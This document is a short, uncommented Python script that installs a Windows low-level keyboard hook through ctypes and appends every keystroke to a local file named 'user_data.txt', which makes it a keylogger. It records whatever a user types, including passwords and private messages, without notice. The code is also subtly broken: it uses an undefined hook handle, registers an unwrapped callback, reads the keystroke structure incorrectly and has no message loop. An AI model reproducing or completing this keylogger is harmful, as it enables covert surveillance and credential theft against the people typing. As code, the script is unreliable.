import sys
import ctypes
def hook_keyboard(nCode, wParam, lParam):
    if nCode >= 0:
        key = chr(lParam[0])
        with open('user_data.txt', 'a') as f:
            f.write(key)
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

ctypes.windll.user32.SetWindowsHookExW(13, hook_keyboard, 0, 0)
ctypes.windll.kernel32.GetMessageW(None, 0, 0, 0)